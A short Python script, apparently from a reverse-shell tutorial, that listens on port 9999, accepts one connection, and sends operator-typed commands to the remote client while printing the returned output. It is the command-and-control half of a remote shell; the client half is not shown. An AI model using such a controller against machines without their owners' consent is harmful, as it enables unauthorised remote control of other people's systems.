import socket
import sys

# Creating of Socket


def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket Creation Error : "+str(msg))

# Binding the port with the ip and listening


def bind_socket():
    try:
        global host
        global port
        global s
        print('Binding the port : '+str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket Binding error"+str(msg)+"Retrying.....")
        # recursion to try Binding again again
        bind_socket()

# After listening to the port it has to accept the connection with the client


def socket_accept():
    connection_object , Address = s.accept()
    # Address is a list and first element is the address and the second element is the port number
    print("The connection has been established IP : " + str(Address[0]) + "|" + str(Address[1]))
    send_commands(connection_object)
    connection_object.close()


# After establishing the connection


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        # We cant send the string directly so we have to convert the string into bytes
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            # Buffer size is 1024 and to convert the output bytes to string we are using utf=0
            output = str(conn.recv(1024),'utf-8')
            # After displaying next line has to introduced for entering new oommand
            print(output, end='')


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()